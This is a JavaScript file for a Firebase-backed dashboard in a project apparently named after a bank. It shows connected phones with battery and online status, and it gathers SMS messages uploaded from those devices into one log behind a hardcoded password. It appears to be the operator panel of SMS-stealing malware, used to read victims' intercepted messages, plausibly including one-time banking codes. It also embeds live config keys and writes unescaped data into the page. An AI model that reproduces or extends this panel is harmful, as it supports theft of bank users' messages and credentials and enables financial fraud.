// Firebase Configuration (Paste your actual config here)
const firebaseConfig = {
    apiKey: "AIzaSyBk9QFAx5Z56tZq6Sezo9w07TQ_hgwgcYM",
    authDomain: "a-comp-hdfc-apcd006.firebaseapp.com",
    databaseURL: "https://a-comp-hdfc-apcd006-default-rtdb.firebaseio.com",
    projectId: "a-comp-hdfc-apcd006",
    storageBucket: "a-comp-hdfc-apcd006.firebasestorage.app",
    messagingSenderId: "688804381427",
    appId: "1:688804381427:web:100568431b4f0c38086d86",
    measurementId: "G-XEM1HDNF45"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Initialize Icons on First Load
lucide.createIcons();

// Check login status on page load
window.addEventListener('DOMContentLoaded', () => {
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    const savedUsername = localStorage.getItem('username');

    if (isLoggedIn === 'true' && savedUsername) {
        displayDashboard(savedUsername);
    }
});

function displayDashboard(username) {
    // Transition UI
    document.getElementById('login-section').classList.add('hidden');
    document.getElementById('dashboard-content').classList.remove('hidden');
    
    // Set User Data
    document.getElementById('nav-user-name').innerText = username;
    document.getElementById('user-initial').innerText = username.charAt(0).toUpperCase();

    // Start Realtime Database listener
    syncDashboardWithFirebase();

    // Set default active tab
    switchTab('home');

    // Trigger icon refresh after dashboard is visible
    setTimeout(() => {
        lucide.createIcons();
    }, 10);
    
    // Change Body Background
    document.body.className = "bg-slate-50 min-h-screen";
}

function syncDashboardWithFirebase() {
    // Listen to the root node to get all data at once
    database.ref('/').on('value', (snapshot) => {
        const data = snapshot.val();
        if (!data) return;

        // 1. Calculate and Update Stats
        const devices = data.Devices || {};
        const deviceArray = Object.values(devices);
        const totalCount = deviceArray.length;
        const onlineCount = deviceArray.filter(d => d.device && d.device.online === 'ONLINE').length;
        const offlineCount = totalCount - onlineCount;

        document.getElementById('stat-all').innerText = totalCount;
        document.getElementById('stat-online').innerText = onlineCount;
        document.getElementById('stat-offline').innerText = offlineCount;
        document.getElementById('stat-activity').innerText = totalCount > 0 ? "92%" : "0%";
        document.getElementById('stat-status').innerText = onlineCount > 0 ? "Online" : "Idle";

        // 2. Update App Info (License Section)
        if (data.AppStats) {
            const approvedDate = new Date(data.AppStats.approved_date);
            document.getElementById('license-expire').innerText = `Approved: ${approvedDate.toLocaleDateString()}`;
            document.getElementById('license-days').innerText = data.AppStats.security_key || "SECURE_ADMIN";
        }

        // 3. Render Admin Status Logs
        const admins = data.admins || {};
        const logsContainer = document.getElementById('notifications-container');
        logsContainer.innerHTML = Object.entries(admins).map(([id, info]) => `
            <div class="flex items-center justify-between p-3 bg-slate-50 rounded-2xl">
                <div class="flex items-center space-x-3">
                    <div class="w-8 h-8 ${info.status === 'ACTIVE' ? 'bg-indigo-100 text-indigo-600' : 'bg-slate-200 text-slate-500'} rounded-full flex items-center justify-center">
                        <i data-lucide="user" class="w-4 h-4"></i>
                    </div>
                    <div class="text-xs">
                        <p class="font-bold text-slate-800">${info.model || 'Admin'}</p>
                        <p class="text-slate-500 text-[10px]">${id.substring(0, 12)}</p>
                    </div>
                </div>
                <span class="text-[9px] font-bold px-2 py-1 rounded-md ${info.status === 'ACTIVE' ? 'bg-green-100 text-green-600' : 'bg-slate-100 text-slate-400'}">${info.status}</span>
            </div>
        `).join('');

        // 4. Render Devices List
        const deviceListContainer = document.getElementById('device-list-container');
        if (deviceListContainer) {
            deviceListContainer.innerHTML = deviceArray.map(dev => `
                <div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-sm flex items-center justify-between">
                    <div class="flex items-center space-x-4">
                        <div class="w-12 h-12 bg-slate-50 rounded-2xl flex items-center justify-center text-slate-400">
                            <i data-lucide="smartphone" class="w-6 h-6"></i>
                        </div>
                        <div>
                            <p class="text-sm font-bold text-slate-800">${dev.device?.device_name || 'Generic Device'}</p>
                            <div class="flex items-center space-x-2 mt-0.5">
                                <span class="text-[10px] font-bold text-slate-400">Bat: ${dev.device?.Battery || 0}%</span>
                                <span class="w-1 h-1 rounded-full bg-slate-300"></span>
                                <span class="text-[10px] font-bold ${dev.device?.online === 'ONLINE' ? 'text-green-500' : 'text-slate-400'}">${dev.device?.online || 'OFFLINE'}</span>
                            </div>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        // 5. Render Global SMS logs
        const smsListContainer = document.getElementById('sms-list-container');
        if (smsListContainer) {
            let allSms = [];
            deviceArray.forEach(dev => {
                if (dev.Sms) {
                    Object.values(dev.Sms).forEach(msg => {
                        allSms.push({ ...msg, deviceName: dev.device?.device_name });
                    });
                }
            });
            
            smsListContainer.innerHTML = allSms.slice(0, 15).map(sms => `
                <div class="bg-white p-4 rounded-2xl border border-slate-100 shadow-sm">
                    <div class="flex justify-between items-start mb-1">
                        <p class="text-[10px] font-bold text-indigo-600 uppercase">${sms.sender}</p>
                        <p class="text-[9px] text-slate-400">${sms.received_time}</p>
                    </div>
                    <p class="text-xs text-slate-700 leading-tight">${sms.message}</p>
                    <div class="flex items-center mt-2 pt-1 border-t border-slate-50">
                        <i data-lucide="smartphone" class="w-2.5 h-2.5 text-slate-300 mr-1"></i>
                        <p class="text-[8px] font-bold text-slate-400">${sms.deviceName || 'Unknown'}</p>
                    </div>
                </div>
            `).join('');
        }

        lucide.createIcons();
    });
}

function attemptLogin() {
    const username = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value;
    const errorMsg = document.getElementById('login-error');

    if (pass === '12345' && username !== "") {
        localStorage.setItem('isLoggedIn', 'true');
        localStorage.setItem('username', username);
        displayDashboard(username);
    } else {
        errorMsg.classList.remove('hidden');
    }
}

function logout() {
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('username');
    location.reload();
}

// Enter key support for login
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') attemptLogin();
});

/**
 * Switches between different dashboard fragments
 * @param {string} tabId - The name of the tab to activate
 */
function switchTab(tabId) {
    const tabs = ['home', 'devices', 'sms', 'more'];
    
    tabs.forEach(id => {
        const section = document.getElementById(`${id}-section`);
        const navBtn = document.getElementById(`nav-${id}`);
        
        if (id === tabId) {
            section.classList.remove('hidden');
            navBtn.classList.add('text-indigo-600');
            navBtn.classList.remove('text-slate-400');
        } else {
            section.classList.add('hidden');
            navBtn.classList.remove('text-indigo-600');
            navBtn.classList.add('text-slate-400');
        }
    });
    
    // Refresh icons for dynamic content
    lucide.createIcons();
}